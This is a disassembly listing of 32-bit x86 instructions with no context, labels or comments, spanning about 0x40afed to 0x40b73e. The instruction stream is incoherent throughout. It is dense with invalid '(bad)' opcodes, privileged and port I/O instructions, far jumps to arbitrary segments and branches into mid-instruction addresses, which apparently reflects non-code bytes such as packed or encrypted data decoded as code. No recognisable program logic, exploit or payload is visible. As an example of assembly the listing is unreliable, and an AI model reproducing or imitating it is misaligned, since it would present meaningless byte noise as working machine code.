  40afed:	call   0x1b4a4ff
  40aff2:	cmp    esp,eax
  40aff4:	sbb    DWORD PTR [ebp+0x4b],ebx
  40aff7:	push   ebp
  40aff8:	lahf   
  40aff9:	stos   DWORD PTR es:[edi],eax
  40affa:	outs   dx,DWORD PTR ds:[esi]
  40affb:	cwde   
  40affc:	and    BYTE PTR [esi-0x5e8e8735],cl
  40b002:	ss (bad) 
  40b004:	int3   
  40b005:	fucom  st(1)
  40b007:	cwde   
  40b008:	or     DWORD PTR [ebx],edx
  40b00a:	pop    ebp
  40b00b:	in     al,0x23
  40b00d:	adc    eax,0x7e871f0c
  40b012:	mov    esp,eax
  40b014:	adc    edi,ebp
  40b016:	int    0x4c
  40b018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b019:	mov    eax,0xe1930ac5
  40b01e:	imul   esp,DWORD PTR [ebx+0x15e91c35],0x26
  40b025:	ja     0x40afb7
  40b027:	div    BYTE PTR [ecx-0x2d]
  40b02a:	sbb    eax,0x35f2df3
  40b02f:	push   eax
  40b030:	sbb    edi,DWORD PTR [esi-0x20b8034e]
  40b036:	aas    
  40b037:	lock jg 0x40affa
  40b03a:	add    al,0xeb
  40b03c:	ror    ah,0xbe
  40b03f:	fst    QWORD PTR [esi]
  40b041:	bound  edi,QWORD PTR [ebx]
  40b043:	pushf  
  40b044:	or     DWORD PTR [eax-0x7534ed04],0xffffff88
  40b04b:	mov    al,ds:0x2b7cc072
  40b050:	push   edx
  40b051:	sar    DWORD PTR [ecx+0x6af608cd],cl
  40b057:	rcl    edx,cl
  40b059:	mov    al,ds:0x487365c9
  40b05e:	xchg   esp,eax
  40b05f:	adc    ecx,DWORD PTR [edi+0x78]
  40b062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b063:	or     al,0xff
  40b065:	ret    0x365a
  40b068:	pop    ebx
  40b069:	ret    
  40b06a:	xor    al,0xc9
  40b06c:	cmp    BYTE PTR [ebp-0x60],0x79
  40b070:	retf   0xa97b
  40b073:	loopne 0x40b00a
  40b075:	sub    edi,esp
  40b077:	adc    DWORD PTR [ebx],esp
  40b079:	cmp    ch,dh
  40b07b:	or     ecx,DWORD PTR [esi]
  40b07d:	cmp    al,0x6c
  40b080:	mov    bh,0x66
  40b082:	mov    esp,0xf545b898
  40b087:	aad    0xc0
  40b089:	cli    
  40b08a:	bound  esp,QWORD PTR [esi+0x69]
  40b08d:	xor    eax,0xaef032f3
  40b092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b093:	cld    
  40b094:	mov    dh,0x33
  40b096:	loopne 0x40b117
  40b098:	lea    ebx,[ebp-0x73]
  40b09b:	ds xchg ebp,eax
  40b09d:	hlt    
  40b09e:	mov    ds:0xab140995,eax
  40b0a3:	sar    DWORD PTR [esi+0x31923660],1
  40b0a9:	xchg   BYTE PTR [edi],ch
  40b0ab:	fstp   TBYTE PTR [edi-0x2fca120d]
  40b0b1:	and    ebp,edi
  40b0b3:	pop    es
  40b0b4:	daa    
  40b0b5:	lods   eax,DWORD PTR ds:[esi]
  40b0b6:	or     esi,edx
  40b0b8:	push   eax
  40b0b9:	sbb    esi,DWORD PTR [esp+esi*4+0x2]
  40b0bd:	sub    bh,BYTE PTR [ecx-0x1]
  40b0c0:	jnp    0x40b097
  40b0c2:	pop    edx
  40b0c3:	out    0xb1,eax
  40b0c5:	adc    al,0x15
  40b0c7:	ss stos BYTE PTR es:[edi],al
  40b0c9:	and    ch,dl
  40b0cb:	pop    esp
  40b0cc:	hlt    
  40b0cd:	sub    eax,0x635b6acc
  40b0d2:	xchg   ecx,eax
  40b0d3:	(bad)  
  40b0d4:	jae    0x40b0ee
  40b0d6:	lock add DWORD PTR [ecx+0x7b],0xffffff9e
  40b0db:	ror    ch,1
  40b0dd:	outs   dx,DWORD PTR ds:[esi]
  40b0de:	inc    ebx
  40b0df:	add    cl,BYTE PTR [esi+eiz*8]
  40b0e2:	xor    BYTE PTR [bx+si+0x674b],al
  40b0e7:	lahf   
  40b0e8:	push   esi
  40b0e9:	pop    ss
  40b0ea:	rcl    DWORD PTR [edx],cl
  40b0ec:	or     al,0x3
  40b0ee:	jmp    0xf5f2:0x364c1379
  40b0f5:	mov    es,WORD PTR [esi+0x13dc8bf5]
  40b0fb:	scas   al,BYTE PTR es:[edi]
  40b0fc:	inc    esp
  40b0fd:	inc    ecx
  40b0fe:	outs   dx,DWORD PTR ds:[esi]
  40b0ff:	jecxz  0x40b112
  40b101:	or     eax,0x1c08c66a
  40b106:	iret   
  40b107:	mov    ecx,0xdf0b91c7
  40b10c:	jecxz  0x40b0cf
  40b10e:	(bad)
  40b111:	cmp    eax,0x34066328
  40b116:	add    al,0x7e
  40b118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b119:	inc    ebx
  40b11a:	xchg   ecx,eax
  40b11b:	(bad)  
  40b11c:	aam    0x83
  40b11e:	cmp    al,0x5e
  40b120:	sti    
  40b121:	jle    0x40b0d1
  40b123:	fcmovbe st,st(1)
  40b125:	push   esi
  40b126:	mov    al,ds:0xd3b235fc
  40b12b:	hlt    
  40b12c:	push   ds
  40b12d:	imul   ebp,DWORD PTR [edx+eiz*2],0xffffff87
  40b131:	jge    0x40b1ad
  40b133:	out    0x95,al
  40b135:	loope  0x40b10b
  40b137:	bound  edi,QWORD PTR [esi+esi*1+0x30]
  40b13b:	out    dx,al
  40b13c:	dec    eax
  40b13d:	into   
  40b13e:	add    BYTE PTR [ebx],bh
  40b140:	mov    WORD PTR [ebx-0x76],ss
  40b143:	push   ebx
  40b144:	rcr    esi,0x9c
  40b147:	iret   
  40b148:	fwait
  40b149:	add    edx,ebx
  40b14b:	(bad)  
  40b14c:	(bad)  
  40b14d:	pop    esp
  40b14e:	bnd ret 0x55b8
  40b152:	cwde   
  40b153:	push   ebp
  40b154:	sbb    dh,BYTE PTR [eax]
  40b156:	xor    eax,0x854e3d80
  40b15b:	sub    BYTE PTR [ecx],cl
  40b15d:	pop    ebx
  40b15e:	pop    eax
  40b15f:	jo     0x40b156
  40b161:	mov    bh,0xd6
  40b163:	ds mov edi,0x6824912a
  40b169:	add    cl,ch
  40b16b:	xor    eax,0xdcb18688
  40b170:	fldenv [ebp-0x23]
  40b173:	push   ecx
  40b174:	mov    ecx,0xa2276538
  40b179:	ficomp WORD PTR [ebp+0x71]
  40b17c:	mov    ch,0x42
  40b17e:	pop    esp
  40b17f:	cmp    DWORD PTR [edx+0x28cfdd81],0xf73b61ef
  40b189:	lds    ecx,FWORD PTR [esi-0x6c]
  40b18c:	mov    ebx,0xa7171f23
  40b191:	loope  0x40b14c
  40b193:	xor    al,0x12
  40b195:	xchg   edx,eax
  40b196:	data16 fs ja 0x40b120
  40b19a:	int3   
  40b19b:	xor    eax,0x92a377a1
  40b1a0:	addr16 jne 0x40b20a
  40b1a3:	jmp    0x49c8:0x4772e3aa
  40b1aa:	sub    ch,BYTE PTR [ecx+0x74]
  40b1ad:	mov    cl,0xfc
  40b1af:	jb     0x40b1d4
  40b1b1:	xchg   ebx,eax
  40b1b2:	ud2    
  40b1b4:	push   0x3c
  40b1b6:	mov    eax,ds:0xb6b2d468
  40b1bb:	mov    al,0x89
  40b1bd:	sbb    BYTE PTR [ebx+0x6],al
  40b1c0:	mov    ah,0x24
  40b1c2:	adc    DWORD PTR [esi],esp
  40b1c4:	pusha  
  40b1c5:	and    ebp,DWORD PTR [ecx-0x2ee3a898]
  40b1cb:	push   edx
  40b1cc:	mov    esi,DWORD PTR [esi+0x45]
  40b1cf:	sub    eax,esp
  40b1d1:	sub    eax,0x4d2ad247
  40b1d6:	mov    ebp,0x619fec6c
  40b1db:	imul   eax,DWORD PTR [esi+0x4],0xffffffab
  40b1df:	sbb    ebx,edx
  40b1e1:	dec    edi
  40b1e2:	lds    esi,FWORD PTR [esi-0xbc4e87]
  40b1e8:	outs   dx,BYTE PTR ds:[esi]
  40b1e9:	mov    dh,BYTE PTR [ecx+edx*1]
  40b1ec:	out    dx,eax
  40b1ed:	mov    DWORD PTR [edi],ebp
  40b1ef:	int    0x8e
  40b1f1:	xor    eax,0x5daddd3e
  40b1f6:	hlt    
  40b1f7:	jp     0x40b1e1
  40b1f9:	retf   0xf5
  40b1fc:	push   0x4fdab6cf
  40b201:	sub    DWORD PTR [edx-0x3935ca63],ebx
  40b207:	mov    eax,0x81a6175b
  40b20c:	cwde   
  40b20d:	lods   al,BYTE PTR ds:[esi]
  40b20e:	stos   BYTE PTR es:[edi],al
  40b20f:	mov    ds:0xd27d652c,eax
  40b214:	push   esi
  40b215:	(bad)  
  40b216:	bound  ebx,QWORD PTR fs:[esi-0x27]
  40b21a:	xchg   esi,eax
  40b21b:	cmp    ecx,edx
  40b21d:	xor    eax,edx
  40b21f:	xchg   ecx,eax
  40b220:	fbld   TBYTE PTR [esi-0x4f96f096]
  40b226:	jbe    0x40b1d4
  40b228:	add    dh,BYTE PTR [edx*2+0x551128b4]
  40b22f:	xchg   dl,ch
  40b231:	loopne 0x40b1d6
  40b233:	pusha  
  40b234:	xor    dl,ch
  40b236:	push   esi
  40b237:	or     ebp,DWORD PTR [esp+ebx*2+0x3fa003e9]
  40b23e:	xchg   edx,eax
  40b23f:	ins    BYTE PTR es:[edi],dx
  40b240:	jns    0x40b2c0
  40b242:	push   0xffffffc4
  40b244:	sub    al,0xc4
  40b246:	rcl    ah,cl
  40b248:	(bad)  
  40b249:	mov    ebp,DWORD PTR [edi+ebx*1]
  40b24c:	cmp    eax,DWORD PTR [esp+ebx*8+0x79]
  40b250:	push   0x2a47aeb6
  40b255:	rcr    DWORD PTR [edi*8+0x48151e8b],cl
  40b25c:	fisub  WORD PTR [eax-0x5c]
  40b25f:	push   edx
  40b260:	aas    
  40b261:	fmul   DWORD PTR [edx]
  40b263:	push   esi
  40b264:	sbb    al,0x5f
  40b266:	jno    0x40b20c
  40b268:	leave  
  40b269:	dec    edx
  40b26a:	(bad)  
  40b26b:	aas    
  40b26c:	jb     0x40b2d4
  40b26e:	push   ebx
  40b26f:	mov    BYTE PTR [ebp+0x737fea3a],ch
  40b275:	je     0x40b28a
  40b277:	sub    eax,DWORD PTR [ebp+0x7afe712a]
  40b27d:	or     ebp,DWORD PTR [eax+0x4bd3f9aa]
  40b283:	sbb    DWORD PTR [edx+0x5e],ebp
  40b286:	dec    edi
  40b287:	mov    ds:0x1c44881a,eax
  40b28c:	loopne 0x40b30d
  40b28e:	fcom   QWORD PTR [ebx+0x61]
  40b291:	test   eax,0x280feedc
  40b296:	add    DWORD PTR [edi+0x2b3c8d81],ebp
  40b29c:	ja     0x40b273
  40b29e:	inc    ebp
  40b29f:	aas    
  40b2a0:	jle    0x40b2ed
  40b2a2:	mov    BYTE PTR [ecx-0x63c6bd6d],dh
  40b2a8:	jne    0x40b2e0
  40b2aa:	jae    0x40b247
  40b2ac:	add    DWORD PTR [edx],ebp
  40b2ae:	sbb    ah,ch
  40b2b0:	push   ds
  40b2b1:	push   ss
  40b2b2:	mov    ch,0xe2
  40b2b4:	outs   dx,BYTE PTR ds:[esi]
  40b2b5:	pusha  
  40b2b6:	push   ss
  40b2b7:	sbb    dl,dl
  40b2b9:	jge    0x40b281
  40b2bb:	not    BYTE PTR [edx+0x66fff23]
  40b2c1:	(bad)  
  40b2c2:	jb     0x40b331
  40b2c4:	xchg   edi,eax
  40b2c5:	push   ebx
  40b2c6:	shl    BYTE PTR [esi-0x1c91d40],0x86
  40b2cd:	adc    ecx,DWORD PTR [edx]
  40b2cf:	push   cs
  40b2d0:	or     al,0xed
  40b2d2:	dec    edx
  40b2d3:	and    edx,edx
  40b2d5:	mov    ds:0xb7c191d9,eax
  40b2da:	ds jp  0x40b2ee
  40b2dd:	xchg   esi,eax
  40b2de:	mov    eax,0x4b6fe158
  40b2e3:	mov    BYTE PTR [ebx+0x7b],ah
  40b2e6:	outs   dx,DWORD PTR ds:[esi]
  40b2e7:	inc    eax
  40b2e8:	push   ss
  40b2e9:	mov    ebx,0xa5d0b70
  40b2ee:	push   edi
  40b2ef:	pushf  
  40b2f0:	popf   
  40b2f1:	jo     0x40b36f
  40b2f3:	jg     0x40b309
  40b2f5:	pop    ebp
  40b2f6:	mov    edx,0xe9130116
  40b2fb:	std    
  40b2fc:	in     al,dx
  40b2fd:	or     bh,BYTE PTR [ebp+ecx*1-0x6e508c10]
  40b304:	pop    ss
  40b305:	pop    esi
  40b306:	push   eax
  40b307:	hlt    
  40b308:	cmp    ah,0x66
  40b30b:	pop    ds
  40b30c:	ja     0x40b2a7
  40b30e:	push   ebx
  40b30f:	out    dx,eax
  40b310:	je     0x40b377
  40b312:	push   esi
  40b313:	and    eax,0xfb1a806
  40b318:	jp     0x40b390
  40b31a:	nop
  40b31b:	mov    esp,0xdac12a
  40b320:	xor    BYTE PTR [ebp+0x1b],ah
  40b323:	and    BYTE PTR [eax+ebx*1-0x443e5cfc],cl
  40b32a:	push   cs
  40b32b:	je     0x40b359
  40b32d:	es shl al,0x22
  40b331:	rol    DWORD PTR [esp+edx*1],cl
  40b334:	add    eax,0xcd49a025
  40b339:	pop    eax
  40b33a:	ror    DWORD PTR [ebp-0x661cee52],cl
  40b340:	scas   eax,DWORD PTR es:[edi]
  40b341:	popa   
  40b342:	xor    dh,cl
  40b344:	xlat   BYTE PTR ds:[ebx]
  40b345:	cmp    bh,ah
  40b347:	pop    ebp
  40b348:	dec    ebx
  40b349:	fisttp DWORD PTR [edx]
  40b34b:	imul   eax,DWORD PTR [esi-0x469ed65b],0x54f43001
  40b355:	adc    edi,esi
  40b357:	lods   al,BYTE PTR ds:[esi]
  40b358:	mov    WORD PTR [edx],fs
  40b35a:	mov    ah,0x5d
  40b35c:	or     cl,BYTE PTR [esi-0x3dfe03e]
  40b362:	push   ds
  40b363:	fcomp  st(7)
  40b365:	inc    esi
  40b366:	xor    al,0xad
  40b368:	dec    esp
  40b369:	cld    
  40b36a:	mov    edi,0xb1586d26
  40b36f:	push   0x68
  40b371:	push   cs
  40b372:	call   FWORD PTR [ebx+0xd]
  40b375:	int3   
  40b376:	xchg   ebx,eax
  40b377:	es (bad) 
  40b379:	jae    0x40b3fa
  40b37b:	dec    DWORD PTR [ebx-0x4b]
  40b37e:	leave  
  40b37f:	iret   
  40b380:	ret    
  40b381:	enter  0x3953,0xa0
  40b385:	gs push esp
  40b387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b388:	(bad)  
  40b389:	lods   eax,DWORD PTR ds:[esi]
  40b38a:	data16 gs (bad) 
  40b38d:	or     bh,dl
  40b38f:	outs   dx,DWORD PTR ds:[esi]
  40b390:	(bad)  
  40b391:	shl    BYTE PTR [ebp+0x334e35fb],1
  40b397:	jmp    0x40b3b3
  40b399:	mov    esp,0x17decea8
  40b39e:	add    al,0xf4
  40b3a0:	outs   dx,BYTE PTR ds:[esi]
  40b3a1:	mov    ah,0xcf
  40b3a3:	jo     0x40b32b
  40b3a5:	imul   edi,DWORD PTR [edi+eiz*2-0x4fc0e824],0x51
  40b3ad:	mov    dh,0xdd
  40b3af:	dec    ecx
  40b3b0:	addr16 jmp 0x4a8b:0x991ba5b7
  40b3b8:	loop   0x40b395
  40b3ba:	push   esp
  40b3bb:	add    cl,ch
  40b3bd:	inc    eax
  40b3be:	inc    ecx
  40b3bf:	ret    
  40b3c0:	add    al,0x70
  40b3c2:	xchg   ebp,eax
  40b3c3:	daa    
  40b3c4:	add    BYTE PTR [ecx],al
  40b3c6:	mov    esi,0x40473fb4
  40b3cb:	cmp    eax,DWORD PTR [esi]
  40b3cd:	jmp    0x40b44b
  40b3cf:	inc    esi
  40b3d0:	mov    DWORD PTR [esi],esp
  40b3d2:	pop    ss
  40b3d3:	bound  edi,QWORD PTR [edx+esi*1+0x3d]
  40b3d7:	fsub   DWORD PTR [ecx]
  40b3d9:	xor    eax,0x51f7b3a4
  40b3de:	out    0xe0,al
  40b3e0:	addr16 sahf 
  40b3e2:	rol    DWORD PTR [edi],cl
  40b3e4:	rcr    DWORD PTR [ebx+0x1b5e5a99],0x6c
  40b3eb:	xchg   ebp,eax
  40b3ec:	popa   
  40b3ed:	adc    ebp,DWORD PTR [edi]
  40b3ef:	add    eax,0xddb8ee4e
  40b3f4:	pop    ecx
  40b3f5:	inc    edi
  40b3f6:	ret    0x798f
  40b3f9:	cmp    eax,0x71e06a05
  40b3fe:	jmp    0x3590:0x499405cd
  40b405:	fcomp  QWORD PTR [ebx]
  40b407:	and    edi,DWORD PTR [eax+0x13]
  40b40a:	test   DWORD PTR [edx],0xb20e11d5
  40b410:	adc    al,bl
  40b412:	sub    BYTE PTR [edi+0x3fc1563f],ah
  40b418:	aas    
  40b419:	leave  
  40b41a:	xchg   ecx,eax
  40b41b:	xchg   DWORD PTR [edi+0x1eb9130e],edx
  40b421:	xchg   edx,eax
  40b422:	adc    dh,cl
  40b424:	daa    
  40b425:	bound  edi,QWORD PTR [eax-0x70]
  40b428:	out    0x8f,eax
  40b42a:	mov    DWORD PTR [eax],eax
  40b42c:	inc    edx
  40b42d:	test   al,0x9d
  40b42f:	fdivrp st(7),st
  40b431:	mov    esp,DWORD PTR [ebx-0x3ab8a633]
  40b437:	or     dl,dh
  40b439:	push   ds
  40b43a:	jno    0x40b4a9
  40b43c:	mov    al,0x75
  40b43e:	sahf   
  40b43f:	jp     0x40b49a
  40b441:	xchg   edi,eax
  40b442:	fwait
  40b443:	rcl    DWORD PTR [edx+0x1],0x46
  40b447:	stos   DWORD PTR es:[edi],eax
  40b448:	mov    ebx,0x2c6c21b5
  40b44d:	lds    esi,FWORD PTR [edi+ecx*2]
  40b450:	loopne 0x40b4cb
  40b452:	neg    BYTE PTR [ebx]
  40b454:	test   dh,0x91
  40b457:	sbb    BYTE PTR [ebx+0x31],dl
  40b45a:	pop    esp
  40b45b:	hlt    
  40b45c:	xchg   ebp,eax
  40b45d:	adc    eax,0x420e50c0
  40b462:	cmp    eax,0xf49ff56f
  40b467:	cmp    al,0x6e
  40b469:	or     eax,0x7d50d2f4
  40b46e:	ret    
  40b46f:	retf   
  40b470:	js     0x40b491
  40b472:	out    0xf9,eax
  40b474:	fsub   st(4),st
  40b476:	push   es
  40b477:	push   ebp
  40b478:	or     DWORD PTR [edi+0x4c768825],0xa1675c48
  40b482:	xchg   edx,eax
  40b483:	push   ebp
  40b484:	push   ebx
  40b485:	fst    QWORD PTR [ecx-0x56]
  40b488:	in     al,0x86
  40b48a:	dec    esi
  40b48b:	jb     0x40b4ea
  40b48d:	mov    eax,0x23ddcb92
  40b492:	pusha  
  40b493:	sub    ebx,DWORD PTR [edi-0x41]
  40b496:	movd   mm5,DWORD PTR [eax+0x13dbf2f7]
  40b49d:	(bad)  
  40b49e:	cmp    al,0x2c
  40b4a0:	xor    al,0x46
  40b4a2:	xchg   DWORD PTR [esi],edx
  40b4a4:	call   0x1ec31545
  40b4a9:	fstp   TBYTE PTR [edx+0x4cbe228c]
  40b4af:	mov    cl,0x38
  40b4b1:	adc    ebp,DWORD PTR [ecx]
  40b4b3:	dec    eax
  40b4b4:	into   
  40b4b5:	in     eax,0x8e
  40b4b7:	dec    edx
  40b4b8:	push   ebp
  40b4b9:	ja     0x40b4f2
  40b4bb:	das    
  40b4bc:	not    edx
  40b4be:	test   BYTE PTR [ebp-0x27],ch
  40b4c1:	fisubr DWORD PTR [esp+ebp*8+0x2]
  40b4c5:	jne    0x40b478
  40b4c7:	pop    ss
  40b4c8:	ret    0x7ffe
  40b4cb:	and    DWORD PTR [ecx+0x6df44f50],esi
  40b4d1:	push   0xd5871572
  40b4d6:	arpl   WORD PTR [ecx-0x3a],sp
  40b4d9:	inc    esi
  40b4da:	and    BYTE PTR [edi],dh
  40b4dc:	jge    0x40b4c7
  40b4de:	xlat   BYTE PTR ds:[ebx]
  40b4df:	mov    edx,0x1f40be7a
  40b4e4:	out    0x67,eax
  40b4e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4e7:	(bad)  
  40b4e8:	jmp    0x40b47e
  40b4ea:	fst    QWORD PTR [ebp+0xa]
  40b4ed:	std    
  40b4ee:	adc    bl,cl
  40b4f0:	daa    
  40b4f1:	cld    
  40b4f2:	adc    cl,BYTE PTR [ebp-0x1]
  40b4f5:	mov    esp,DWORD PTR ds:0x6e664e86
  40b4fb:	repz pop esi
  40b4fd:	and    ebp,DWORD PTR [ebp+0x71e88973]
  40b503:	xchg   ebp,eax
  40b504:	jg     0x40b56e
  40b506:	cmp    bl,dh
  40b508:	sbb    eax,DWORD PTR [esi-0x5275f181]
  40b50e:	iret   
  40b50f:	idiv   DWORD PTR [ebp+0x5a]
  40b512:	mov    dh,dh
  40b514:	mov    ah,0xd4
  40b516:	pop    ebp
  40b517:	cwde   
  40b518:	ret    0x1702
  40b51b:	or     edi,DWORD PTR [ecx+0x11396dd9]
  40b521:	iret   
  40b522:	add    bh,BYTE PTR [edi]
  40b524:	or     ebx,DWORD PTR [ecx-0x68f0964e]
  40b52a:	aaa    
  40b52b:	xchg   edx,edi
  40b52d:	(bad)  
  40b52e:	mov    edx,0xf24c7cee
  40b533:	dec    ecx
  40b534:	adc    dl,BYTE PTR [eax+0x65]
  40b537:	js     0x40b4cf
  40b539:	sbb    ah,BYTE PTR [ebx-0x3241af45]
  40b53f:	std    
  40b540:	add    eax,edi
  40b542:	fnstsw WORD PTR es:[eax]
  40b545:	enter  0xd9f2,0xa5
  40b549:	push   cs
  40b54a:	xchg   esp,eax
  40b54b:	retf   
  40b54c:	sbb    eax,0xc694b6d7
  40b551:	mov    dl,0xf6
  40b553:	or     al,0x49
  40b555:	jle    0x40b5c5
  40b557:	push   es
  40b558:	aam    0x7
  40b55a:	adc    esp,DWORD PTR [ecx]
  40b55c:	adc    BYTE PTR [eax+0x61],dh
  40b55f:	mov    BYTE PTR [ebp+0x10],dh
  40b562:	dec    ebp
  40b563:	push   cs
  40b564:	imul   DWORD PTR [ebp-0x6816851d]
  40b56a:	adc    ah,cl
  40b56c:	fcmovb st,st(5)
  40b56e:	cwde   
  40b56f:	xchg   edx,eax
  40b570:	cmp    eax,0xedda5134
  40b575:	xchg   edx,eax
  40b576:	adc    DWORD PTR [esi],edi
  40b578:	mov    edi,0x18164506
  40b57d:	push   ss
  40b57e:	push   esi
  40b57f:	out    dx,eax
  40b580:	mov    bh,0x99
  40b582:	mov    edx,0x138b11a3
  40b587:	mov    al,ds:0x45869b53
  40b58c:	mov    dh,0x67
  40b58e:	in     al,0x8c
  40b590:	dec    ecx
  40b591:	sub    bl,BYTE PTR [ebx-0x9]
  40b594:	sbb    al,0x63
  40b596:	aas    
  40b597:	lods   al,BYTE PTR ds:[esi]
  40b598:	repnz pop esp
  40b59a:	mov    ecx,0x115c869c
  40b59f:	mov    bl,0x42
  40b5a1:	mov    dh,0xd4
  40b5a3:	inc    esp
  40b5a4:	cs inc esp
  40b5a6:	or     al,0x3a
  40b5a8:	add    bh,BYTE PTR [ecx-0x10]
  40b5ab:	inc    esi
  40b5ac:	mov    dh,0x35
  40b5ae:	(bad)  
  40b5b0:	push   es
  40b5b1:	dec    edi
  40b5b2:	xchg   ebx,eax
  40b5b3:	jnp    0x40b57f
  40b5b5:	mov    ecx,0x35ed9cf9
  40b5ba:	push   eax
  40b5bb:	cdq    
  40b5bc:	or     al,0x17
  40b5be:	lods   eax,DWORD PTR ds:[esi]
  40b5bf:	jecxz  0x40b550
  40b5c1:	pop    ebp
  40b5c2:	xlat   BYTE PTR ds:[ebx]
  40b5c3:	loop   0x40b589
  40b5c5:	inc    eax
  40b5c6:	out    dx,al
  40b5c7:	pop    edi
  40b5c8:	cs mov bh,0x75
  40b5cb:	push   eax
  40b5cc:	stos   BYTE PTR es:[edi],al
  40b5cd:	imul   edi,DWORD PTR [eax+0x37],0x420e1db
  40b5d4:	push   es
  40b5d5:	ins    BYTE PTR es:[edi],dx
  40b5d6:	jbe    0x40b58e
  40b5d8:	pop    ebp
  40b5d9:	test   al,0xee
  40b5db:	test   BYTE PTR [ebp+0x7f0cc2e5],bl
  40b5e1:	std    
  40b5e2:	imul   edx,ebp,0x6b
  40b5e5:	or     edi,ecx
  40b5e7:	sar    BYTE PTR [ebx+0x6295a797],1
  40b5ed:	mov    edi,0x989d210
  40b5f2:	(bad)  
  40b5f3:	fwait
  40b5f4:	xor    eax,0xc383ebe0
  40b5f9:	leave  
  40b5fa:	sbb    BYTE PTR [ebp+esi*2-0x5b],dh
  40b5fe:	sbb    BYTE PTR [ecx+ebp*8+0x44],0xce
  40b603:	ret    
  40b604:	inc    edi
  40b605:	push   esp
  40b606:	pop    ecx
  40b607:	jmp    0xcdf7:0x2328e5c5
  40b60e:	icebp  
  40b60f:	enter  0x9a30,0xed
  40b613:	push   cs
  40b614:	sbb    al,0xbb
  40b616:	inc    ebx
  40b617:	jmp    0x239534c0
  40b61c:	mov    edi,0xd8abea6d
  40b621:	cmp    ch,bl
  40b623:	jg     0x40b5ac
  40b625:	fiadd  WORD PTR [edi]
  40b627:	adc    bl,bh
  40b629:	test   al,0xeb
  40b62b:	mov    WORD PTR gs:[ebx-0x394fdd42],ss
  40b632:	fnstcw WORD PTR [eax]
  40b634:	sub    esp,DWORD PTR [ecx-0x6e]
  40b637:	and    BYTE PTR [eax-0x78],0x5f
  40b63b:	test   ebp,ebx
  40b63d:	or     BYTE PTR [edi+0x2c],al
  40b640:	pusha  
  40b641:	sub    al,0x72
  40b643:	or     BYTE PTR [edx],bh
  40b645:	mov    cl,0x4b
  40b647:	js     0x40b642
  40b649:	sbb    ah,cl
  40b64b:	stc    
  40b64c:	and    edx,DWORD PTR [ecx+0x36465b73]
  40b652:	out    dx,eax
  40b653:	mov    fs,WORD PTR [edi-0x2d675749]
  40b659:	and    bh,BYTE PTR [eax-0x50]
  40b65c:	test   eax,0xc95475c4
  40b661:	add    esp,DWORD PTR [edx]
  40b663:	push   ds
  40b664:	pop    ss
  40b665:	mov    DWORD PTR [eax],esi
  40b667:	dec    ebp
  40b668:	mov    bl,0xc1
  40b66a:	mov    bl,0xee
  40b66c:	push   ebp
  40b66d:	mov    esp,0x49a7f4bd
  40b672:	dec    ebp
  40b673:	mov    ah,0x17
  40b675:	xchg   edi,esi
  40b677:	lods   eax,DWORD PTR ds:[esi]
  40b678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b679:	aam    0x67
  40b67b:	call   DWORD PTR [esp+edi*8]
  40b67e:	test   eax,0x35646a80
  40b683:	add    dh,ah
  40b685:	cmp    eax,0xe83fc3d0
  40b68a:	dec    edx
  40b68b:	ror    al,0x4d
  40b68e:	fdivr  QWORD PTR [ecx]
  40b690:	sbb    esp,DWORD PTR [edi]
  40b692:	ret    0xd961
  40b695:	nop    DWORD PTR [eax+0x11fc311d]
  40b69c:	les    ebx,FWORD PTR [edx]
  40b69e:	dec    dh
  40b6a0:	inc    esi
  40b6a1:	cmp    dl,dh
  40b6a3:	xlat   BYTE PTR ds:[ebx]
  40b6a4:	add    al,0xaf
  40b6a6:	pop    eax
  40b6a7:	(bad)  
  40b6a8:	mov    edx,ebp
  40b6aa:	jmp    DWORD PTR [ebx]
  40b6ac:	cmp    bh,BYTE PTR [eax+edx*2-0x64]
  40b6b0:	jecxz  0x40b6bc
  40b6b2:	pop    ecx
  40b6b3:	cmc    
  40b6b4:	push   edi
  40b6b5:	std    
  40b6b6:	int3   
  40b6b7:	mov    ds:0x8b574c85,eax
  40b6bc:	cmp    dl,BYTE PTR [edx]
  40b6be:	mov    eax,0xe06e41f3
  40b6c3:	inc    esi
  40b6c4:	adc    al,0xfc
  40b6c6:	jge    0x40b681
  40b6c8:	(bad)  [ecx-0x5b]
  40b6cb:	test   eax,0xafe7b0d3
  40b6d0:	push   es
  40b6d1:	icebp  
  40b6d2:	jns    0x40b6b1
  40b6d4:	jg     0x40b66a
  40b6d6:	adc    al,BYTE PTR [esi-0x1308d4a1]
  40b6dc:	xchg   DWORD PTR [ecx],esi
  40b6de:	mov    dl,0xec
  40b6e0:	(bad)  
  40b6e1:	sbb    DWORD PTR ss:[ebp+0x4fa7b0bb],eax
  40b6e8:	in     al,dx
  40b6e9:	dec    edi
  40b6ea:	sbb    DWORD PTR [edx-0x3b],esp
  40b6ed:	adc    edx,DWORD PTR [ebx]
  40b6ef:	jl     0x40b736
  40b6f1:	into   
  40b6f2:	pop    edx
  40b6f3:	dec    ebx
  40b6f4:	jge    0x40b736
  40b6f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6f7:	dec    eax
  40b6f8:	sub    eax,0x2fe7a312
  40b6fd:	sub    DWORD PTR [ebp+0x52517dfe],edx
  40b703:	loop   0x40b73a
  40b705:	dec    ebx
  40b706:	in     eax,0x60
  40b708:	mov    ebx,0x7b08fb0c
  40b70d:	dec    edi
  40b70e:	mov    bl,0x5
  40b710:	mov    ebp,0xce52c6a
  40b715:	iret   
  40b716:	ret    
  40b717:	bound  edx,QWORD PTR [esi]
  40b719:	aam    0xef
  40b71b:	mov    al,ds:0xbb551b5d
  40b720:	xor    eax,0x50584d28
  40b725:	push   es
  40b726:	ficomp DWORD PTR [esi+ebp*4+0x3d]
  40b72a:	out    dx,eax
  40b72b:	ins    DWORD PTR es:[edi],dx
  40b72c:	int    0xb4
  40b72e:	xchg   edi,eax
  40b72f:	push   ds
  40b730:	popa   
  40b731:	test   DWORD PTR [esi],ebp
  40b733:	jmp    0x3a9e597a
  40b738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b739:	sub    al,0x2a
  40b73b:	and    esi,edi
  40b73d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b73e:	or     ch,BYTE PTR [ecx-0x1fea372b]
